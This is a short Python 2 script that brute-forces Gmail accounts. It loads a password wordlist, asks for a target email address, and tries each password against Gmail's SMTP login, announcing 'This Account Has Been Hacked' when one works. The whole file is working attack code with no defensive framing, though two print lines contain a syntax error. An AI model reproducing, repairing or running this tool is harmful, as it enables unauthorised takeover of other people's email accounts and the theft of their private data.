#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import smtplib
from os import system

W = '\033[1;37;40m'
Br = '\033[1;31;40m'
Bg = '\033[1;32;40m'
Y = '\033[1;33;40m'
Bb = '\033[1;34;40m'
Bm = '\033[1;35;40m'
Bc = '\033[1;36;40m'

def main():
   print(Br+"""
  ____                 _ _ 
 / ___|_ __ ___   __ _(_) |
| |  _| '_ ` _ \ / _` | | |
| |_| | | | | | | (_| | | |
 \____|_| |_| |_|\__,_|_|_|
                           
""")
main()
file_path = raw_input('path of passwords file : ')
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email : ')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print W+'[+] This Account Has Been Hacked Password :' Bg+ password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print W+'[+] this account has been hacked, password :' Bg+ password + '     ^_^'

            break
         else:
            print Y+'[!] password not found => ' +Br+ password
login()
